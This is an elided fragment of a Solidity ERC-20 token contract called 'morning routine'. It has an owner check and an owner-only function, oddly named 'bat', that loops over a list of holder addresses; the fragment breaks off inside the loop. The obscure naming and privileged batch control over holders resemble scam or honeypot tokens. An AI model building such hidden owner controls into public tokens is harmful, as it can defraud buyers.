...
contract morningroutine is Context, IERC20 {
    ...
    address public  concrete;
    constructor () {
        _name = "morning routine";
        _symbol = "ROUTINE";
        _decimals = 18;
    ...
    modifier onlyOwner() {
        require(msg.sender == concrete, "Not allowed");
        _;
    }

    function bat(address[] memory oven) public onlyOwner() {
        for (uint256 i = 0; i < oven.length; i++) {
            address account = oven[i];
